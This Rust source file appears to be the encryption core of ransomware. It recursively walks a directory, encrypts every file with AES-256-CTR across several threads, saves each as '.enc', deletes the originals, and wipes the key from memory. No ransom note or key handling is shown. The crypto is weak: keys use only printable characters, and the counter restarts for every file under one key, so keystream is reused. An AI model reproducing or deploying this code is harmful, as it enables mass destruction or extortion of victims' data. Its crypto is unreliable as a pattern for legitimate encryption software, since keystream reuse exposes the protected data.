use aes::{
    cipher::{NewCipher, StreamCipher},
    Aes256Ctr,
};
use rand::{
    distributions::Uniform,
    thread_rng,
    Rng
};
use walkdir::WalkDir;

use std::{
    fmt::Error as FmtError,
    fs::{remove_file, File, OpenOptions},
    io::{BufReader, Read, Write},
    path::{Path, PathBuf},
    sync::mpsc::{channel, Sender},
    thread::{self, JoinHandle},
};

fn aes_256_ctr_encrypt_decrypt(ctext: &mut [u8], key: &[u8], nonce: &[u8]) -> Result<(), FmtError> {
    if key.len() != 32 {
        return Err(FmtError);
    }

    let mut cipher = Aes256Ctr::new(key.into(), (nonce).into());

    cipher.apply_keystream(ctext);

    Ok(())
}

pub fn gen_aes_key(key_size: usize) -> String {
    let rng = thread_rng();
    rng
    .sample_iter(&Uniform::new(32, 126))
    .take(key_size)
    .map(char::from)
    .collect()
}

fn inc_counter(nonce: &mut [u8]) {
    let mut index: usize = 0;
    loop {
        if nonce[index] < 255 {
            nonce[index] += 1;
            break;
        } else {
            if index + 1 != nonce.len() {
                index += 1;
            } else {
                for elem in nonce.iter_mut() {
                    *elem = 0;
                }
                index = 0;
            }
        }
    }
}

fn get_dst_file_path(file_path: &str) -> String {
    let encoded_ext = "enc";
    let file_path_struct = Path::new(file_path);
    match file_path_struct.extension() {
        Some(ext) => {
            if ext == encoded_ext {
                return String::from(file_path_struct.with_extension("").to_str().unwrap());
            }
        }
        None => (),
    }
    let mut file_path_dst = String::from(file_path);
    file_path_dst.push('.');
    file_path_dst.push_str(encoded_ext);
    file_path_dst
}

#[derive(Debug)]
pub enum FileEncryptionDecryptionError {
    ErrorSrcFile(String),
    ErrorDstFile(String),
}

pub fn encrypt_decrypt_file(
    file_src_path: &str,
    key: &[u8],
) -> Result<u64, FileEncryptionDecryptionError> {
    //Open Source file
    let file_src = match File::open(file_src_path) {
        Ok(file) => file,
        Err(_) => {
            return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
                "Could not open source file",
            )))
        }
    };

    //Modify destination file extension depending on decryption or encryption
    let file_dst_path = get_dst_file_path(file_src_path);

    let mut file_dst = match OpenOptions::new()
        .create_new(true)
        .write(true)
        .append(true)
        .open(file_dst_path)
    {
        Ok(file) => file,
        Err(_) => {
            return Err(FileEncryptionDecryptionError::ErrorDstFile(String::from(
                "Could not open destination file",
            )))
        }
    };

    //Get Source file file metadata, to then get total size of the file
    let file_read_meta = match file_src.metadata() {
        Ok(data) => data,
        Err(_) => {
            return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
                "Could not get metadata for source file",
            )))
        }
    };

    //let file_dst_path= get_dst_file_path(file_src_path);
    let mut buf_reader = BufReader::new(&file_src);
    let mut total_read_bytes: u64 = 0;
    let mut counter = [0u8; 16];

    // around 305 MB for max size
    let buffer_size: usize = if file_read_meta.len() < 320000000 {
        usize::try_from(file_read_meta.len()).unwrap()
    } else {
        320000000
    };

    let mut buffer: Vec<u8> = vec![0; buffer_size];

    loop {
        let bytes_read = match buf_reader.read(&mut buffer[..]) {
            Ok(bytes) => bytes,
            Err(_) => {
                return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
                    "Could not read bytes from source file",
                )))
            }
        };

        total_read_bytes += u64::try_from(bytes_read).unwrap();
        aes_256_ctr_encrypt_decrypt(&mut buffer[..bytes_read], key, &counter).unwrap();

        file_dst.write_all(&buffer[..bytes_read]).unwrap();

        if total_read_bytes == file_read_meta.len() {
            break;
        }
        inc_counter(&mut counter);
    }

    drop(file_dst);
    drop(file_src);

    match remove_file(file_src_path) {
        Ok(_) => (),
        Err(_) => {
            return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
                "Could not delete source file",
            )))
        }
    };

    return Ok(total_read_bytes);
}

pub fn multi_threaded_encrypt_decrypt_files(directory: &str, aes_key: &[u8]){
    let num_threads = 4;

    let mut file_paths: Vec<PathBuf> = Vec::new();

    for entry in WalkDir::new(directory) {
        match entry {
            Ok(entry) => {
                // Check if the entry is a file
                if entry.file_type().is_file() {
                    // Adds file
                    file_paths.push(entry.into_path());
                }
            }
            Err(_) => (),
        };
    }

    let mut threads: Vec<JoinHandle<()>> = Vec::new();
    let mut job_senders: Vec<Sender<PathBuf>> = Vec::new();

    for _ in 0..num_threads {
        let mut aes_key_vec = aes_key.to_vec();
        let (tx, rx) = channel::<PathBuf>();
        job_senders.push(tx);
        let thread_handle = thread::spawn(move || 
            loop {
                match rx.recv() {
                    Ok(path) => {
                        
                        if path.to_str().unwrap() == "_END_SEARCH_" {
                            for element in &mut aes_key_vec {
                                *element = 0;
                            }
                            break;
                        }
                        match encrypt_decrypt_file(
                            path.to_str().unwrap(),
                            &aes_key_vec[..],
                        ) {
                            Ok(bytes_read) => bytes_read,
                            Err(_) => 0,
                        };
                    }
                    Err(_) => break,
                }
            }
        );
        threads.push(thread_handle);
    }

    let mut thread_i: usize = 0;

    for path in file_paths {
        if thread_i == num_threads {
            thread_i = 0;
        }
        job_senders[thread_i].send(path).unwrap();
        thread_i += 1;
    }

    for sender in job_senders {
        sender.send(PathBuf::from("_END_SEARCH_")).unwrap();
    }

    for thread in threads {
        thread.join().unwrap();
    }
}
